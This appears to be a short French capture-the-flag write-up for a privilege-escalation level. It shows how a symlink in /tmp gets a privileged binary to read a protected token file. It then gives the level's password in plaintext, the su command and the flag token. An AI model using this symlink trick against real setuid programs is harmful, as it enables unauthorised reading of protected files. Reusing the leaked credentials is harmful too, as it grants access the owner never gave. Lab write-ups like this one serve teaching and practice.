Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

Nous avons pu observer qu'il y avait deux fichier, un binaire avec les droit sudo/un txt sans aucun droit
Nous avons deduit que le binaire aller servir a lire le txt, par consequent
nous avons fait un lien symbolique sur le fichier text que nous avons passe en
parametre du binaire.

ln -s /home/user/level08/token /tmp/try
./level08 /tmp/try
su flag08
quif5eloekouj29ke0vouxean
getflag
